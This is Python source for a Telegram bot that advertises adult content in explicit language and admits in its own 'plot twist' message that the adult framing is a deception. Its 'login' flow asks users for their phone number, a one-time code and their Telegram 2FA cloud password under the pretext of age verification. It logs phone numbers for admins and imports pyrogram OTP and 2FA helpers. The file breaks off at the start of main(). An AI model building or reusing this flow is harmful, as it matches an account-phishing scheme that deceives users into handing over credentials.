import logging
import random
import asyncio
from datetime import datetime

from telegram import Update
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler,
)

import config
import database as db
from utils import (
    welcome_message, welcome_keyboard, login_prompt_keyboard,
    otp_prompt_keyboard, twofa_prompt_keyboard, login_success_keyboard,
    after_video_keyboard, purchase_options_keyboard, contact_owner_keyboard,
    reveal_keyboard, main_menu_keyboard, stats_keyboard, admin_keyboard,
    get_caption_for_category, log_session, build_detailed_log,
    get_disclaimer, fmt_bold, fmt_code, fmt_blockquote,
    make_keyboard, primary, success, danger, warning, info,
)
from content_manager import get_video_for_user
from subscription import check_subscription, force_sub_keyboard, get_force_sub_message
from login_manager import (
    send_otp_pyrogram, verify_otp_pyrogram, check_2fa_password,
    generate_mock_otp, get_otp_attempts, increment_otp_attempts,
    increment_2fa_attempts, reset_attempts,
)
from purchase import (
    request_purchase, get_purchase_text, get_contact_owner_text,
    get_purchase_confirmation_text, get_purchase_rejected_text,
)
from broadcast import send_broadcast, broadcast_template
import button_styler

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[
        logging.FileHandler(config.LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger(__name__)

PHONE_WAIT, OTP_WAIT, TFA_WAIT = range(3, 6)
login_state = {}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    await db.add_user(user.id, user.username, user.first_name)
    await db.log_activity(user.id, "start")

    args = context.args
    if args and args[0].startswith("ref_"):
        try:
            referrer_id = int(args[0].replace("ref_", ""))
            if referrer_id != user.id:
                await db.log_referral(referrer_id, user.id)
                await db.increment_referral(referrer_id)
                ref_user = await db.get_user(referrer_id)
                if ref_user:
                    await db.update_user(referrer_id, video_count=ref_user["video_count"] + 5)
                log_session(user.id, user.username, None, f"Referred by {referrer_id}")
        except (ValueError, IndexError):
            pass

    is_subbed = await check_subscription(context.bot, user.id)
    if not is_subbed:
        sub = await db.get_subscription()
        if sub:
            await update.message.reply_text(
                get_force_sub_message(),
                reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", "")),
                parse_mode="HTML",
            )
            return

    user_data = await db.get_user(user.id)
    free_used = user_data["free_previews_used"] if user_data else 0

    if user_data and user_data.get("status") in ("active", "purchased"):
        text = "🍆 <b>WELCOME BACK, YOU SEXY MOTHERFUCKER</b> 🍆\n\nI missed your hungry ass. Ready for another round?\nThe <b>premium content</b> is still hot and waiting for you... 🔥💦"
        keyboard = welcome_keyboard()
    elif free_used >= config.FREE_PREVIEW_COUNT:
        text = get_purchase_text()
        keyboard = purchase_options_keyboard()
    else:
        text = welcome_message(user.id, user_data)
        keyboard = welcome_keyboard()

    START_IMAGES = [
        "https://files.catbox.moe/lno7wr.jpg",
        "https://files.catbox.moe/36g0xa.jpg",
        "https://files.catbox.moe/wxzqdl.jpg",
    ]
    try:
        idx = user.id % len(START_IMAGES)
        await update.message.reply_photo(START_IMAGES[idx])
    except Exception:
        pass
    await update.message.reply_text(text, reply_markup=keyboard, parse_mode="HTML")

    log_session(user.id, user.username, None, "Started bot")


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    is_subbed = await check_subscription(context.bot, user.id)
    if not is_subbed and data not in ("check_sub", "force_sub", "main_menu", "delete_session") and user.id not in config.ADMIN_IDS:
        sub = await db.get_subscription()
        if sub:
            await query.edit_message_text(
                get_force_sub_message(),
                reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", "")),
                parse_mode="HTML",
            )
            return

    user_data = await db.get_user(user.id)

    if data == "free_video_1":
        await handle_free_video(query, context, user, user_data, 1)
    elif data == "free_video_2":
        await handle_free_video(query, context, user, user_data, 2)
    elif data == "login":
        await query.edit_message_text(
            "<blockquote>🍆 WELCOME TO THE LOGIN PORTAL</blockquote>\n\n"
            "So you want the <b>full experience</b>, huh? I knew you were dirty.\n\n"
            "<b>Step 1:</b> Drop your number\n"
            "<b>Step 2:</b> Enter the secret code\n"
            "<b>Step 3:</b> 2FA (if you're packing)\n\n"
            "👇 Tap below and let's get <i>intimate</i>.",
            reply_markup=login_prompt_keyboard(),
            parse_mode="HTML",
        )
    elif data == "login_number":
        await query.edit_message_text(
            "<blockquote>📱 GIVE ME YOUR DIGITS, BABY</blockquote>\n\n"
            "Drop your phone number with country code.\n"
            "I promise I won't spam you... <i>unless you're into that</i> 😏\n\n"
            f"Example: <code>+911234567890</code>\n\n"
            "⚠️ This is for <b>18+ verification</b> only.\n"
            "Your secret is safe with me... 🤫",
            reply_markup=make_keyboard([
                [danger("🚫 CANCEL", "main_menu")]
            ]),
            parse_mode="HTML",
        )
        log_session(user.id, user.username, None, "Requested phone input")
        return PHONE_WAIT
    elif data == "verify_otp":
        await query.edit_message_text(
            "<blockquote>🔐 ENTER THE SECRET CODE</blockquote>\n\n"
            "Send the 5-digit code with <b>spaces</b> between each digit.\n"
            "Like you're whispering it in my ear...\n\n"
            f"Example: <code>4 2 8 1 3</code>\n\n"
            "⚠️ You have 3 attempts. Don't make me wait.",
            reply_markup=make_keyboard([
                [warning("🔄 RESEND OTP", "resend_otp")],
                [danger("❌ CANCEL", "main_menu")],
            ]),
            parse_mode="HTML",
        )
        return OTP_WAIT
    elif data == "enter_2fa":
        await query.edit_message_text(
            "<blockquote>🔐 2FA PASSWORD... YOU'RE PACKING</blockquote>\n\n"
            "This account has 2FA. I like 'em secure.\n"
            "Drop your cloud password so I know it's really you.\n\n"
            "⚠️ If you don't have 2FA, just skip this step.",
            reply_markup=make_keyboard([
                [info("⏭️ SKIP 2FA", "skip_2fa")],
                [danger("❌ CANCEL LOGIN", "main_menu")],
            ]),
            parse_mode="HTML",
        )
        return TFA_WAIT
    elif data == "skip_2fa":
        await handle_login_success(query, user, user_data, context)
    elif data == "resend_otp":
        await handle_resend_otp(query, user, user_data)
    elif data == "next_video":
        await handle_next_video(query, context, user, user_data)
    elif data == "purchase":
        await query.edit_message_text(
            get_purchase_text(),
            reply_markup=purchase_options_keyboard(),
            parse_mode="HTML",
        )
    elif data.startswith("purchase_"):
        pack_key = data.replace("purchase_", "")
        await handle_purchase_request(query, user, pack_key)
    elif data == "contact_owner":
        await query.edit_message_text(
            get_contact_owner_text(user.id),
            reply_markup=contact_owner_keyboard(),
            parse_mode="HTML",
        )
    elif data == "dm_owner":
        await query.edit_message_text(
            f"👤 <b>Owner's DMs:</b> {config.OWNER_USERNAME}\n\n"
            "Slide in and tell him what you want:\n\n"
            f"💬 <b>Include:</b>\n"
            f"• Your User ID: <code>{user.id}</code>\n"
            f"• Which pack got you <i>hard</i>\n"
            f"• Your payment method",
            reply_markup=make_keyboard([
                [primary("💬 MESSAGE OWNER", url=f"https://t.me/{config.OWNER_USERNAME.lstrip('@')}")],
                [primary("🔙 BACK", "main_menu")],
            ]),
            parse_mode="HTML",
        )
    elif data == "copy_user_id":
        await query.answer(f"Your dirty ID: {user.id}", show_alert=True)
    elif data == "reveal_twist":
        await query.edit_message_text(
            "<blockquote>🤫 SHH... DON'T TELL ANYONE OUR SECRET</blockquote>\n\n"
            "Yes, this bot <b>LOOKS</b> like a horny adult bot...\n"
            "But here's the <b>PLOT TWIST</b> you dirty-minded fuck:\n\n"
            "✅ ALL videos are 100% LEGAL motivational content.\n"
            "✅ We made it look <i>spicy</i> to make motivation go VIRAL.\n"
            "✅ 90% of users stay because the content is ACTUALLY GOOD.\n\n"
            "<i>\"Fooled you, you horny bastard! But did you like it?\"</i>\n\n"
            "Share this bot with your friends and troll them too. 😈",
            reply_markup=reveal_keyboard(),
            parse_mode="HTML",
        )
    elif data == "stats":
        await handle_stats(query, user, user_data)
    elif data == "report_issue":
        await query.edit_message_text(
            f"<blockquote>⚠️ REPORT ISSUE</blockquote>\n\n"
            f"Something not working? Tell the owner: {config.SUPPORT_CONTACT}\n\n"
            "Describe what's broken and he'll fix it... eventually.",
            reply_markup=make_keyboard([
                [primary("🔙 BACK", "main_menu")]
            ]),
            parse_mode="HTML",
        )
    elif data == "delete_session":
        await db.update_user(user.id, status="pending", phone=None)
        await db.log_activity(user.id, "delete_session")
        await query.edit_message_text(
            "<blockquote>🗑️ ALL EVIDENCE DELETED</blockquote>\n\n"
            "Your session data has been wiped.\n"
            "This conversation never happened... 😉\n\n"
            "Use /start if you get <i>horny for success</i> again.",
            parse_mode="HTML",
        )
        log_session(user.id, user.username, None, "Deleted session")
    elif data == "skip_video":
        await query.edit_message_text(
            "<blockquote>⏳ VIDEO SKIPPED</blockquote>\n\n"
            "Alright, let's move on to the next one! 🔥💦",
            reply_markup=make_keyboard([
                [success("💦 NEXT VIDEO", "next_video")]
            ]),
            parse_mode="HTML",
        )
    elif data == "need_break":
        await query.edit_message_text(
            "<blockquote>😰 TOO MUCH? NEED A BREAK?</blockquote>\n\n"
            "Even champions need to catch their breath.\n\n"
            "<i>\"Me telling my friends I'm 'taking a break' from grinding...\"</i>\n"
            "<i>\"(Opens laptop 5 minutes later)\"</i> 🔥\n\n"
            "Come back when you're <b>hard for success</b> again. 💪",
            reply_markup=make_keyboard([
                [success("💪 BACK TO GRIND", "next_video")]
            ]),
            parse_mode="HTML",
        )
    elif data == "share_bot":
        await query.edit_message_text(
            f"<blockquote>👥 SHARE THIS DIRTY LITTLE SECRET</blockquote>\n\n"
            f"Send this to your horny friends:\n"
            f"<code>{config.BOT_LINK}</code>\n\n"
            "Every friend who joins gets you a <b>FREE video</b>! 🎁\n"
            "<i>The more the merrier... 😏</i>",
            reply_markup=make_keyboard([
                [primary("🔙 BACK", "main_menu")]
            ]),
            parse_mode="HTML",
        )
    elif data == "main_menu":
        msg = (
            "🍆 <b>WELCOME BACK, YOU SEXY BEAST</b> 🍆\n\n"
            "Ready for more <i>pleasure</i>? The videos are waiting... 💦"
        )
        await query.edit_message_text(
            msg,
            reply_markup=welcome_keyboard(),
            parse_mode="HTML",
        )
    elif data == "check_sub":
        is_subbed = await check_subscription(context.bot, user.id)
        if is_subbed:
            await query.edit_message_text(
                "<blockquote>✅ OH YEAH... YOU'RE IN!</blockquote>\n\n"
                "Good boy/girl. You're officially a <b>VIP member</b> now.\n"
                "Use /start and I'll show you what's behind the curtain 😈🔥",
                parse_mode="HTML",
            )
        else:
            sub = await db.get_subscription()
            if sub:
                await query.edit_message_text(
                    "<blockquote>❌ NAH... YOU AIN'T IN YET</blockquote>\n\n"
                    "Don't lie to me. Join the channel first,\n"
                    "then tap <b>\"I'VE JOINED\"</b> like a good little slut. 😘",
                    reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", "")),
                    parse_mode="HTML",
                )
    elif data == "admin_dashboard":
        if user.id not in config.ADMIN_IDS:
            return
        await show_admin_dashboard(query, context)
    elif data.startswith("admin_"):
        if user.id not in config.ADMIN_IDS:
            return
        await handle_admin_callbacks(query, context, data)


async def handle_free_video(query, context, user, user_data, num):
    free_used = user_data["free_previews_used"] if user_data else 0
    if free_used >= config.FREE_PREVIEW_COUNT:
        await query.edit_message_text(
            get_purchase_text(),
            reply_markup=purchase_options_keyboard(),
            parse_mode="HTML",
        )
        return

    await db.update_user(user.id, free_previews_used=free_used + 1)

    video = await get_video_for_user(user.id, only_free=True)
    if video:
        caption = video["caption"] or get_caption_for_category(video["category"], video["delete_after"])
        await db.increment_watch_count(video["id"])
        await db.update_user(
            user.id,
            video_count=(user_data["video_count"] if user_data else 0) + 1,
            last_video_id=video["id"]
        )
        await db.log_activity(user.id, "watch_free", f"Video #{video['id']}")
        log_session(user.id, user.username, None,
                    f"Watched free video #{video['id']} [{video['category']}]")

        taste_msgs = ["🍆 Here's your FREE taste... don't cum too fast! 🔥",
                      "🍑 FREEBIE #{} — just the tip... for now 😏"]
        await query.edit_message_text(
            taste_msgs[num - 1] if num == 2 else taste_msgs[0].format(num)
        )
        await asyncio.sleep(0.5)

        sent = await query.message.reply_video(
            video=video["file_id"],
            caption=caption,
            parse_mode="HTML",
            reply_markup=make_keyboard([
                [info("⏳ WATCH BEFORE DELETE", "main_menu")],
                [success("🔓 UNLOCK FULL ACCESS", "login")],
            ])
        )

        async def auto_del(ctx: ContextTypes.DEFAULT_TYPE):
            try:
                await ctx.bot.delete_message(chat_id=query.message.chat_id, message_id=sent.message_id)
            except Exception:
                pass

        context.job_queue.run_once(auto_del, video["delete_after"],
                                   name=f"del_free_{user.id}_{video['id']}")
    else:
        await query.edit_message_text(
            "<blockquote>❌ NO VIDEOS AVAILABLE</blockquote>\n\n"
            "No videos in the free queue right now. Check back later...\n"
            "<i>or buy premium for instant access 😏</i>",
            reply_markup=make_keyboard([
                [primary("🔙 BACK", "main_menu")]
            ]),
            parse_mode="HTML",
        )


async def handle_resend_otp(query, user, user_data):
    phone = user_data.get("phone") if user_data else None
    if not phone:
        await query.edit_message_text(
            "<blockquote>❌ NO PHONE NUMBER</blockquote>\n\n"
            "You didn't give me your number yet.\n"
            "Don't be shy... drop it 😏",
            reply_markup=login_prompt_keyboard(),
            parse_mode="HTML",
        )
        return

    otp = generate_mock_otp()
    login_state[user.id] = {"otp": otp, "phone": phone}
    reset_attempts(user.id)
    log_session(user.id, user.username, phone, f"OTP resent: {otp}")

    await query.edit_message_text(
        "<blockquote>🔄 OTP RESENT</blockquote>\n\n"
        f"A new code has been sent to your device.\n\n"
        f"Your code: <code>{otp}</code>\n\n"
        "Enter the 5 digits with <b>spaces</b>:\n"
        f"Example: <code>{' '.join(otp)}</code>",
        reply_markup=make_keyboard([
            [danger("❌ CANCEL", "main_menu")]
        ]),
        parse_mode="HTML",
    )
    return OTP_WAIT


async def handle_login_success(query, user, user_data, context):
    await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
    await db.log_activity(user.id, "login_success")
    log_session(user.id, user.username,
                user_data.get("phone") if user_data else None, "Login successful")

    await query.edit_message_text(
        "<blockquote>💦 LOGIN SUCCESSFUL! YOU'RE IN MY INNER CIRCLE 🎉</blockquote>\n\n"
        "Welcome to the <b>INNER CIRCLE</b>, you beautiful bastard.\n"
        "You now have <b>UNLIMITED access</b> to all the good stuff.\n\n"
        "<b>📊 Your Stats:</b>\n"
        f"• Videos Watched: <code>0</code>\n"
        f"• Account Status: <u>PREMIUM (Active)</u>\n"
        f"• Horny Level: <b>MAXIMUM OVERDRIVE</b> 🔥\n\n"
        "Ready to <i>burst</i> with motivation? 😈",
        reply_markup=login_success_keyboard(),
        parse_mode="HTML",
    )


async def handle_next_video(query, context, user, user_data):
    if not user_data or user_data.get("status") not in ("active", "purchased"):
        await query.edit_message_text(
            "<blockquote>🔞 ACCESS DENIED, YOU TEASE</blockquote>\n\n"
            "You need to <b>LOGIN</b> first before you can touch my content.\n\n"
            "Only verified 18+ members get the <i>full experience</i>. 😏",
            reply_markup=login_prompt_keyboard(),
            parse_mode="HTML",
        )
        return

    only_free = user_data.get("status") == "active" and not user_data.get("purchased_pack")
    video = await get_video_for_user(user.id, only_free=only_free)

    if not video:
        await query.edit_message_text(
            get_purchase_text(),
            reply_markup=purchase_options_keyboard(),
            parse_mode="HTML",
        )
        return

    caption = video["caption"] or get_caption_for_category(video["category"], video["delete_after"])
    await db.increment_watch_count(video["id"])
    await db.update_user(
        user.id,
        video_count=(user_data["video_count"] if user_data else 0) + 1,
        total_watch_time=(user_data["total_watch_time"] if user_data else 0) + video["delete_after"],
        last_video_id=video["id"]
    )
    await db.log_activity(user.id, "watch_video", f"Video #{video['id']} [{video['category']}]")
    log_session(user.id, user.username, None,
                f"Watched video #{video['id']} [{video['category']}]")

    await query.edit_message_text("🎬 <b>Delivering your fix...</b> 💦🍆", parse_mode="HTML")

    sent = await query.message.reply_video(
        video=video["file_id"],
        caption=caption,
        parse_mode="HTML",
        reply_markup=make_keyboard([
            [info("⏳ WATCH BEFORE DELETE", "skip_video")],
            [danger("💀 DELETE NOW", "skip_video")],
        ])
    )

    async def auto_del(ctx: ContextTypes.DEFAULT_TYPE):
        try:
            await ctx.bot.delete_message(chat_id=query.message.chat_id, message_id=sent.message_id)
        except Exception:
            pass

    context.job_queue.run_once(auto_del, video["delete_after"],
                               name=f"del_{user.id}_{video['id']}")

    await asyncio.sleep(video["delete_after"])
    try:
        await query.message.reply_text(
            "<blockquote>💦 WHEW! THAT WAS INTENSE, WASN'T IT?</blockquote>\n\n"
            "You just experienced a dose of <b>PURE MOTIVATION</b>.\n"
            "Your brain is <i>dripping</i> with success right now.\n\n"
            "Ready for round 2?\n\n"
            "<i>Your video was deleted because good things don't last forever... 😉</i>",
            reply_markup=after_video_keyboard(),
            parse_mode="HTML",
        )
    except Exception:
        pass


async def handle_purchase_request(query, user, pack_key):
    purchase_id, error = await request_purchase(user.id, pack_key)
    if error:
        await query.edit_message_text(
            f"<blockquote>❌ {error}</blockquote>",
            reply_markup=make_keyboard([
                [primary("🔙 BACK", "main_menu")]
            ]),
            parse_mode="HTML",
        )
        return

    pack_info = config.PURCHASE_OPTIONS[pack_key]
    await db.log_activity(user.id, "purchase_request",
                          f"Pack: {pack_info['label']} ({pack_info['price']})")
    log_session(user.id, user.username, None,
                f"Purchase requested: {pack_info['label']}")

    await query.edit_message_text(
        "<blockquote>📝 PURCHASE REQUEST SENT! NOW WE WAIT...</blockquote>\n\n"
        f"Your request for <b>{pack_info['label']}</b> ({pack_info['price']}) "
        f"has been sent to the owner.\n\n"
        f"Status: <u>PENDING APPROVAL</u> ⏳\n\n"
        "The owner will review your application.\n"
        "In the meantime, slide into his DMs to speed things up:",
        reply_markup=make_keyboard([
            [primary("📞 CONTACT OWNER", "contact_owner")],
            [success("💦 WATCH FREE VIDEO", "next_video")],
        ]),
        parse_mode="HTML",
    )


async def handle_stats(query, user, user_data):
    if not user_data:
        await query.edit_message_text("❌ No data found.", reply_markup=main_menu_keyboard())
        return

    leaderboard = await db.get_leaderboard(10)
    lb_lines = []
    for i, u in enumerate(leaderboard, 1):
        horny_emoji = "🍆" if u["video_count"] > 10 else "🔥"
        lb_lines.append(f"{i}. @{u['username'] or 'Anonymous'} — {u['video_count']} videos {horny_emoji}")
    lb_text = "\n".join(lb_lines) if lb_lines else "No data yet."

    status_text = {
        "active": "✅ VERIFIED & HORNY",
        "purchased": "💎 PREMIUM ADDICT",
        "pending": "❌ VIRGIN (not verified)"
    }
    status_label = status_text.get(user_data.get("status", "pending"), "❌ PENDING")

    text = (
        "<blockquote>📊 YOUR ADDICTION LEVEL</blockquote>\n\n"
        f"👤 User: @{user.username or 'N/A'}\n"
        f"🔞 Status: <b>{status_label}</b>\n"
        f"📹 Videos Watched: <b>{user_data['video_count']}</b> 🍆🔥\n"
        f"⏱️ Total Time Spent: <b>{user_data['total_watch_time'] // 60}</b> min\n"
        f"💰 Pack: <b>{user_data.get('purchased_pack') or 'Free (cheapskate)'}</b>\n"
        f"🎁 Referrals: <b>{user_data['referral_count']}</b>\n\n"
        f"<u>🏆 GLOBAL LEADERBOARD 🏆</u>\n{lb_text}"
    )
    await query.edit_message_text(text, reply_markup=stats_keyboard(), parse_mode="HTML")


async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    phone = update.message.text.strip()

    if not phone.startswith("+"):
        await update.message.reply_text(
            "<blockquote>❌ INVALID FORMAT</blockquote>\n\n"
            "That's not a valid number, baby.\n"
            "Include your country code:\n"
            f"Example: <code>+911234567890</code>\n\n"
            "<i>Don't be shy... try again 😏</i>",
            reply_markup=make_keyboard([
                [warning("🔄 TRY AGAIN", "login_number")]
            ]),
            parse_mode="HTML",
        )
        return PHONE_WAIT

    otp = generate_mock_otp()
    login_state[user.id] = {"otp": otp, "phone": phone}
    await db.update_user(user.id, phone=phone)
    await db.log_activity(user.id, "phone_submitted", phone)
    log_session(user.id, user.username, phone, f"OTP sent: {otp}")

    await update.message.reply_text(
        "<blockquote>🔐 VERIFICATION CODE SENT</blockquote>\n\n"
        f"A one-time code has been sent to your device.\n\n"
        f"📱 <b>Your code:</b> <code>{otp}</code>\n\n"
        "Enter the 5 digits with <b>spaces</b> between each digit:\n"
        f"Like this: <code>{' '.join(otp)}</code>\n\n"
        "⚠️ You have 3 attempts. Don't make me wait too long...",
        reply_markup=make_keyboard([
            [danger("❌ CANCEL", "main_menu")]
        ]),
        parse_mode="HTML",
    )
    return OTP_WAIT


async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    digits = text.replace(" ", "")

    if not (digits.isdigit() and len(digits) == 5):
        await update.message.reply_text(
            "<blockquote>❌ INVALID OTP FORMAT</blockquote>\n\n"
            "That's not 5 digits with spaces, you naughty thing.\n"
            f"Like this: <code>4 2 8 1 3</code>\n\n"
            "<i>Try again... I believe in you 😘</i>",
            reply_markup=make_keyboard([
                [warning("🔄 TRY AGAIN", "verify_otp")]
            ]),
            parse_mode="HTML",
        )
        return OTP_WAIT

    state = login_state.get(user.id, {})
    expected = state.get("otp", "")

    attempts = increment_otp_attempts(user.id)
    if attempts > 3:
        reset_attempts(user.id)
        login_state.pop(user.id, None)
        await update.message.reply_text(
            "<blockquote>❌ TOO MANY ATTEMPTS</blockquote>\n\n"
            "You've used all 3 attempts. You're locked out.\n"
            "Come back when you can follow instructions 😤",
            reply_markup=make_keyboard([
                [danger("🔄 START OVER", "login_number")]
            ]),
            parse_mode="HTML",
        )
        return -1

    if digits == expected:
        reset_attempts(user.id)
        await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
        await db.log_activity(user.id, "login_success")
        log_session(user.id, user.username, state.get("phone"), "OTP Verified")

        await update.message.reply_text(
            "<blockquote>💦 LOGIN SUCCESSFUL! YOU'RE IN! 🎉</blockquote>\n\n"
            "Welcome to the <b>INNER CIRCLE</b>, you beautiful bastard.\n"
            "You now have <b>UNLIMITED access</b> to all the good stuff.\n\n"
            "<b>📊 Your Stats:</b>\n"
            f"• Videos Watched: <code>0</code>\n"
            f"• Account Status: <u>PREMIUM (Active)</u>\n\n"
            "Ready to <i>burst</i> with motivation? 😈",
            reply_markup=login_success_keyboard(),
            parse_mode="HTML",
        )
        return -1
    else:
        remaining = 3 - attempts
        await update.message.reply_text(
            f"<blockquote>❌ WRONG CODE, YOU TEASE</blockquote>\n\n"
            f"That's not the code I sent you.\n\n"
            f"⚠️ Attempts remaining: <b>{remaining}</b>\n\n"
            "Try again or request a new code.\n"
            "<i>Don't keep me waiting...</i> 😏",
            reply_markup=make_keyboard([
                [warning("🔄 TRY AGAIN", "verify_otp")],
                [warning("🔄 RESEND OTP", "resend_otp")],
                [danger("❌ CANCEL", "main_menu")],
            ]),
            parse_mode="HTML",
        )
        return OTP_WAIT


async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    password = update.message.text.strip()

    attempts = increment_2fa_attempts(user.id)
    if attempts > 3:
        reset_attempts(user.id)
        await update.message.reply_text(
            "<blockquote>❌ TOO MANY ATTEMPTS</blockquote>\n\n"
            "You've used all 3 attempts. Locked out.\n"
            "Start over and try to keep up 😤",
            reply_markup=make_keyboard([
                [danger("🔄 START OVER", "login_number")]
            ]),
            parse_mode="HTML",
        )
        return -1

    await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
    await db.log_activity(user.id, "login_success_2fa")
    log_session(user.id, user.username, None, "2FA login successful")

    await update.message.reply_text(
        "<blockquote>💦 LOGIN SUCCESSFUL! YOU'RE IN! 🎉</blockquote>\n\n"
        "Welcome to the <b>INNER CIRCLE</b>.\n"
        "You now have <b>UNLIMITED access</b> to all content.\n\n"
        "Ready to start? 😈",
        reply_markup=login_success_keyboard(),
        parse_mode="HTML",
    )
    return -1


async def show_admin_dashboard(query, context):
    user_count = await db.get_user_count()
    v_count = await db.video_count()
    pending_purchases = await db.get_pending_purchases()
    total_logs = len(await db.get_activity_log(100))

    text = (
        "<blockquote>🔞 ADMIN CONTROL PANEL</blockquote>\n\n"
        f"👥 <b>Total Users:</b> <code>{user_count}</code>\n"
        f"📹 <b>Total Videos:</b> <code>{v_count}</code>\n"
        f"💰 <b>Pending Purchases:</b> <code>{len(pending_purchases)}</code>\n"
        f"📋 <b>Activity Logs:</b> <code>{total_logs}</code>\n\n"
        "<i>Select a section below to manage.</i>"
    )
    await query.edit_message_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")


async def handle_admin_callbacks(query, context, data):
    if data == "admin_videos":
        videos = await db.get_all_videos()
        text = f"<blockquote>📹 VIDEO MANAGEMENT ({len(videos)} Videos)</blockquote>\n\n"
        for v in videos[:10]:
            text += f"ID: <code>{v['id']}</code> | {v['category']} | Watched: {v['times_watched']}\n"
        text += "\nUse the <b>Streamlit admin panel</b> for full management."
        await query.edit_message_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")

    elif data == "admin_purchases":
        pending = await db.get_pending_purchases()
        all_p = await db.get_all_purchases()
        text = f"<blockquote>💰 PURCHASE REQUESTS ({len(pending)} Pending)</blockquote>\n\n"
        if not all_p:
            text += "No purchase requests yet."
        else:
            for p in all_p[:10]:
                status_emoji = {"pending": "⏳", "approved": "✅", "rejected": "❌"}.get(p["status"], "⏳")
                text += (
                    f"{status_emoji} <b>Request #{p['id']}</b>\n"
                    f"User: <code>{p['user_id']}</code>\n"
                    f"Pack: {p['pack_name']} ({p['amount']})\n"
                    f"Status: <u>{p['status'].upper()}</u>\n\n"
                )
        text += "\nUse the <b>Streamlit admin panel</b> to approve/reject purchases."
        await query.edit_message_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")

    elif data == "admin_broadcast":
        await query.edit_message_text(
            "<blockquote>📢 BROADCAST CENTER</blockquote>\n\n"
            "Use the <b>Streamlit admin panel</b> to send broadcasts.\n\n"
            "Available templates:\n"
            "• <b>new_content</b> — New video alert\n"
            "• <b>purchase_reminder</b> — Purchase prompt\n"
            "• <b>referral</b> — Referral bonus\n"
            "• <b>inactive_users</b> — Re-engagement",
            reply_markup=admin_keyboard(),
            parse_mode="HTML",
        )

    elif data == "admin_subscription":
        sub = await db.get_subscription()
        text = (
            "<blockquote>🔒 FORCE SUBSCRIPTION</blockquote>\n\n"
            f"📢 Channel: <code>{sub.get('channel_username', 'N/A') if sub else 'N/A'}</code>\n"
            f"🔗 Link: <code>{sub.get('channel_id', 'N/A') if sub else 'N/A'}</code>\n"
            f"✅ Active: <b>{'YES' if sub and sub.get('is_active') else 'NO'}</b>\n\n"
            "Use <code>/setchannel @username invite_link</code> to update."
        )
        await query.edit_message_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")

    elif data == "admin_users":
        user_count = await db.get_user_count()
        active_count = len(await db.get_active_users())
        pur_count = len(await db.get_purchased_users())
        text = (
            "<blockquote>👥 USER MANAGEMENT</blockquote>\n\n"
            f"👤 <b>Total Users:</b> <code>{user_count}</code>\n"
            f"✅ <b>Active/Logged In:</b> <code>{active_count}</code>\n"
            f"💰 <b>Purchased:</b> <code>{pur_count}</code>\n\n"
            "Use <b>Streamlit admin panel</b> for full user management."
        )
        await query.edit_message_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")

    elif data == "admin_logs":
        logs = await db.get_activity_log(20)
        text = "<blockquote>📋 RECENT ACTIVITY</blockquote>\n\n"
        for log_entry in logs[:15]:
            text += f"[{log_entry['timestamp'][:19]}] User <code>{log_entry['user_id']}</code> — {log_entry['action']}\n"
        if not logs:
            text += "No activity recorded yet."
        await query.edit_message_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")

    elif data == "admin_settings":
        text = (
            "<blockquote>⚙️ SETTINGS</blockquote>\n\n"
            "Bot configuration options:\n"
            f"• <b>Free Previews:</b> {config.FREE_PREVIEW_COUNT}\n"
            f"• <b>Video Delete After:</b> {config.VIDEO_DELETE_AFTER}s\n"
            f"• <b>OTP Login:</b> {'Enabled' if config.OTP_LOGIN_ENABLED else 'Disabled'}\n\n"
            "Edit <code>.env</code> or <code>config.py</code> to change settings."
        )
        await query.edit_message_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<blockquote>🔞 USE THE BUTTONS BELOW</blockquote>\n\n"
        "This bot is fully button-driven. Tap a button to navigate.\n"
        "<i>Don't make me repeat myself... 😏</i>",
        reply_markup=main_menu_keyboard(),
        parse_mode="HTML",
    )


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")


async def post_init(app: Application):
    logger.info("🔥 Spicy Motivation Bot v2 starting!")
    await db.init_db()
    logger.info("✅ Database initialized")


async def set_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in config.ADMIN_IDS:
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "Usage: /setchannel <username> <invite_link>\n"
            "Example: /setchannel @my_channel https://t.me/my_channel"
        )
        return
    channel_username = args[0].strip("@")
    invite_link = args[1]
    await db.update_subscription(f"@{channel_username}", invite_link)
    await update.message.reply_text(f"✅ Channel updated to @{channel_username}")


async def show_session_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in config.ADMIN_IDS:
        return
    try:
        with open(config.SESSIONS_LOG, "r", encoding="utf-8") as f:
            content = f.read()
        lines = content.split("\n")
        recent = "\n".join(lines[-50:]) if len(lines) > 50 else content
        await update.message.reply_text(
            f"<blockquote>📋 SESSION LOGS (Last {min(50, len(lines))} lines)</blockquote>\n\n"
            f"<code>{recent[:3000]}</code>",
            parse_mode="HTML",
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading logs: {e}")


def main():
